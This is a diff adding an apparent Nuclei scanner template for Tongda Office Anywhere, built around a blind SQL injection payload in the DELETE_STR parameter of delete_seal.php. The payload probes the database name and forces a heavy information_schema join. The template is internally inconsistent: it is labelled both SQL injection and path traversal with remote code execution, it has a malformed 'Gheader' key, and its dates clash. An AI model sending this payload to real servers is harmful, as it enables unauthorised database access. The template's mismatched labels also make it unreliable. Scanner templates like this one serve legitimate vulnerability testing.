@@ -1,0 +1,40 @@
+id: tongda-oav11-sql注入
+time: "2023-08-02"
+
+info:
+  name: Office Anywhere TongDa - Path Traversal
+  author: pikpikcu
+  severity: critical
+  description: 容易受到路径遍历漏洞的影响，可以利用这些漏洞来执行远程代码执行。
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-77
+  tags: tongda,lfi
+  metadata:
+    max-request: 1
+
+http:
+  - method: 
+      - GET
+    path:
+      - "{{BaseURL}}/general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1"
+    
+    Gheader:
+      - Accept-Encoding:gzip, deflate & Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  & Upgrade-Insecure-Requests:1
+        
+
+    matchers-condition: and
+    matchers:
+      
+      - type: word
+        part: header
+        words:
+          - "manage.php?start"
+        condition: and
+      
+      - type: status
+        status:
+          - 302
+
+# Enhanced by mp on 2022/05/30
